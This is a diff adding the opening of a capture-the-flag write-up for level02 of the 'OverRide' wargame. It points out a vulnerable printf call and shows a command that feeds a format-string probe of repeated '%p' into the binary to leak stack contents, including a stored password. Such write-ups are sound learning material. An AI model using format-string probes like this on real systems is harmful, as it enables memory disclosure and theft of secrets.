@@ -1,3 +1,5 @@
+# Level02
+
 After looking at the code, we see that the password of level03 is stored in a variable, and there is a vulnerable call to printf if the password check fails. At first we try to simply print the content of the stack to see if there's anything relevant (see [rainfall levels 03-05](https://github.com/SERAC-SGM/rainfall-42)) :
 
     level02@OverRide:~$ python -c 'print " %p" * 50' | ./level02 
